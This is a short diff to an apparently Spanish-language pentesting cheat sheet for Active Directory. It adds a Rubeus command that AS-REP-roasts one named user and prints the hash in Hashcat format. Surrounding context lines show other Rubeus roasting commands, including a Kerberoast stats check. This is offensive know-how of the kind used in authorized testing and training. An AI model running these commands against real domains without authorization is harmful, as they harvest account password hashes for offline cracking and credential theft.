@@ -5,6 +5,11 @@
 Rubeus.exe asreproast /nowrap
 ```
 
+#### ASREPRoast Attack a un usuario en especifico y en formato Hashcat
+```console
+Rubeus.exe asreproast /user:<USER> /nowrap /format:hashcat
+```
+
 #### Saber si hay cuentas Kerberoastables
 ```console
 Rubeus.exe kerberoast /stats
